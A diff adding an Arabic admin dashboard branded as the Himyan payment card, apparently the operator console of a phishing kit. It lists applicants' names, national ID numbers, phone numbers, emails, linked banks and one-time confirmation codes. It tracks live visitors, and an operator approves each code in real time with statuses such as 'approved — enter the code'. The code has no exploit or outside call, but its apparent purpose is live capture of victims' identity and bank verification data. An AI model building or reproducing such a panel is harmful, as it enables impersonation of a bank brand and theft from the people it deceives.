@@ -1,0 +1,103 @@
+﻿<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="لوحة إدارة طلبات هميان." />
+  <title>لوحة الإدارة | هميان</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body class="admin-page">
+  <main class="admin-main">
+    <section class="admin-login" id="login-panel">
+      <div class="admin-brand"><img src="assets/logo.svg" alt="هميان" /><span>Admin</span></div>
+      <h1>لوحة الإدارة</h1>
+      <p>سجّل الدخول لمتابعة الطلبات والزوار النشطين.</p>
+      <form id="login-form" class="admin-login-form">
+        <label class="field"><span>اسم المستخدم</span><input name="username" value="admin" autocomplete="username" required /></label>
+        <label class="field"><span>كلمة المرور</span><input type="password" name="password" autocomplete="current-password" required /></label>
+        <button class="submit-button" type="submit">دخول</button>
+        <p class="admin-error" id="login-error" hidden>بيانات الدخول غير صحيحة.</p>
+      </form>
+    </section>
+
+    <section class="admin-dashboard" id="dashboard-panel" hidden>
+      <header class="admin-header">
+        <div><h1>لوحة الإدارة</h1><p>متابعة الطلبات والزوار النشطين في الموقع.</p></div>
+        <div class="admin-header-actions"><a href="index.html" class="admin-home-link">عرض الموقع</a><button id="logout-button" class="admin-logout">تسجيل الخروج</button></div>
+      </header>
+      <div class="admin-stats">
+        <article class="stat-card stat-live"><span class="stat-icon">◉</span><div><small>الزوار النشطون الآن</small><strong id="active-visitors">0</strong></div></article>
+        <article class="stat-card"><span class="stat-icon">▣</span><div><small>إجمالي الطلبات</small><strong id="total-requests">0</strong></div></article>
+        <article class="stat-card"><span class="stat-icon">!</span><div><small>طلبات جديدة</small><strong id="new-requests">0</strong></div></article>
+      </div>
+      <section class="requests-panel">
+        <div class="requests-heading"><div><h2>الطلبات الواردة</h2><p id="last-updated">جارٍ التحديث...</p></div><button id="refresh-button" class="refresh-button">تحديث</button></div>
+        <div class="requests-table-wrap"><table class="requests-table"><thead><tr><th>التاريخ</th><th>الاسم</th><th>نوع البطاقة</th><th>الجوال</th><th>البريد الإلكتروني</th><th>الحالة</th><th>الإجراءات</th></tr></thead><tbody id="requests-body"><tr><td colspan="7" class="empty-row">لا توجد طلبات حتى الآن.</td></tr></tbody></table></div>
+      </section>
+    </section>
+    <div class="details-modal" id="details-modal" hidden role="dialog" aria-modal="true" aria-labelledby="details-title">
+      <div class="modal-backdrop" data-close-modal></div>
+      <section class="details-dialog">
+        <header class="details-header"><div><span class="section-kicker">هميان</span><h2 id="details-title">تفاصيل الطلب</h2></div><button class="modal-close" type="button" aria-label="إغلاق" data-close-modal>×</button></header>
+        <div class="details-grid" id="details-content"></div>
+        <footer class="details-footer"><button class="admin-logout" type="button" data-close-modal>إغلاق</button></footer>
+      </section>
+    </div>
+  </main>
+  <script>
+    const loginPanel = document.querySelector('#login-panel');
+    const dashboardPanel = document.querySelector('#dashboard-panel');
+    const loginForm = document.querySelector('#login-form');
+    const loginError = document.querySelector('#login-error');
+    const requestsBody = document.querySelector('#requests-body');
+    const activeVisitors = document.querySelector('#active-visitors');
+    const totalRequests = document.querySelector('#total-requests');
+    const newRequests = document.querySelector('#new-requests');
+    const lastUpdated = document.querySelector('#last-updated');
+    let currentRequests = [];
+    const labels = { prepaid: 'مسبقة الدفع', debit: 'خصم مباشر', citizen: 'مواطن', resident: 'مقيم', new: 'جديد', pending: 'بانتظار قرار المشرف', code_pending: 'بانتظار مراجعة الرمز', approved: 'مقبول — أدخل الرمز', code_approved: 'الرمز مقبول', rejected: 'مرفوض', code_rejected: 'الرمز مرفوض', handled: 'تمت المتابعة' };
+    function escapeHtml(value) { return String(value ?? '').replace(/[&<>'"]/g, (char) => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', "'":'&#39;', '"':'&quot;' }[char])); }
+    function formatDate(value) { try { return new Intl.DateTimeFormat('ar-QA', { dateStyle: 'medium', timeStyle: 'short' }).format(new Date(value)); } catch { return value; } }
+    function renderRequests(requests) {
+      currentRequests = requests;
+      if (!requests.length) { requestsBody.innerHTML = '<tr><td colspan="7" class="empty-row">لا توجد طلبات حتى الآن.</td></tr>'; return; }
+      requestsBody.innerHTML = requests.map((request) => { const decisionButtons = ['approved', 'rejected', 'code_approved', 'code_rejected'].includes(request.status) ? '' : `<button class="row-action approve-action" type="button" data-action="approve" data-request-id="${escapeHtml(request.id)}">قبول</button><button class="row-action reject-action" type="button" data-action="reject" data-request-id="${escapeHtml(request.id)}">رفض</button>`; const statusClass = ['approved', 'code_approved', 'handled'].includes(request.status) ? 'is-handled' : ['rejected', 'code_rejected'].includes(request.status) ? 'is-rejected' : ['pending', 'code_pending'].includes(request.status) ? 'is-pending' : ''; return `<tr><td>${escapeHtml(formatDate(request.createdAt))}</td><td class="name-cell">${escapeHtml(request.fullName)}</td><td>${escapeHtml(labels[request.cardType] || request.cardType)}</td><td dir="ltr">${escapeHtml(request.mobile)}</td><td dir="ltr">${escapeHtml(request.email)}</td><td><span class="status-badge ${statusClass}">${escapeHtml(labels[request.status] || request.status)}</span></td><td><div class="row-actions"><button class="row-action details-action" type="button" data-action="details" data-request-id="${escapeHtml(request.id)}">التفاصيل</button>${decisionButtons}</div></td></tr>`; }).join('');
+      requestsBody.querySelectorAll('[data-action]').forEach((button) => button.addEventListener('click', async () => {
+        const request = currentRequests.find((item) => item.id === button.dataset.requestId);
+        if (!request) return;
+        if (button.dataset.action === 'details') return openDetails(request);
+        if (button.dataset.action === 'redirect') { window.location.href = `mailto:${encodeURIComponent(request.email)}?subject=${encodeURIComponent('متابعة طلب بطاقة هميان')}`; return; }
+        const next = button.dataset.action === 'approve' ? 'approved' : button.dataset.action === 'reject' ? 'rejected' : '';
+        if (!next) return;
+        button.disabled = true;
+        const response = await fetch('/api/admin/requests', { method:'PATCH', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ id:request.id, status:next }) });
+        if (response.ok) loadSummary(); else button.disabled = false;
+      }));
+    }
+    const detailsModal = document.querySelector('#details-modal');
+    const detailsContent = document.querySelector('#details-content');
+    function openDetails(request) {
+      const detailRows = [['التاريخ', formatDate(request.createdAt)], ['الاسم الكامل', request.fullName], ['رقم الهوية', request.nationalId || '—'], ['نوع البطاقة', labels[request.cardType] || request.cardType], ['رقم الجوال', `+974 ${request.mobile}`], ['البريد الإلكتروني', request.email], ['الجنسية', labels[request.nationality] || request.nationality], ['البنك المرتبط', request.bank], ['رمز التأكيد', request.confirmationCode || 'لم يُرسل بعد'], ['الحالة', labels[request.status] || request.status]];
+      detailsContent.innerHTML = detailRows.map(([label, value]) => `<div class="detail-item"><span>${escapeHtml(label)}</span><strong>${escapeHtml(value)}</strong></div>`).join('');
+      detailsModal.hidden = false;
+      document.body.classList.add('modal-open');
+      detailsModal.querySelector('.modal-close').focus();
+    }
+    function closeDetails() { detailsModal.hidden = true; document.body.classList.remove('modal-open'); }
+    detailsModal.querySelectorAll('[data-close-modal]').forEach((element) => element.addEventListener('click', closeDetails));
+    document.addEventListener('keydown', (event) => { if (event.key === 'Escape' && !detailsModal.hidden) closeDetails(); });
+    async function loadSummary() { const response = await fetch('/api/admin/summary'); if (response.status === 401) { showLogin(); return; } const data = await response.json(); activeVisitors.textContent = data.activeVisitors; totalRequests.textContent = data.totalRequests; newRequests.textContent = data.newRequests; lastUpdated.textContent = `آخر تحديث: ${formatDate(data.updatedAt)}`; renderRequests(data.requests); }
+    function showDashboard() { loginPanel.hidden = true; dashboardPanel.hidden = false; loadSummary(); window.summaryTimer = setInterval(loadSummary, 10000); }
+    function showLogin() { loginPanel.hidden = false; dashboardPanel.hidden = true; if (window.summaryTimer) clearInterval(window.summaryTimer); }
+    loginForm.addEventListener('submit', async (event) => { event.preventDefault(); loginError.hidden = true; const values = Object.fromEntries(new FormData(loginForm).entries()); const response = await fetch('/api/admin/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(values) }); if (response.ok) showDashboard(); else loginError.hidden = false; });
+    document.querySelector('#logout-button').addEventListener('click', async () => { await fetch('/api/admin/logout', { method:'POST' }); showLogin(); });
+    document.querySelector('#refresh-button').addEventListener('click', loadSummary);
+    loadSummary();
+  </script>
+</body>
+</html>
+
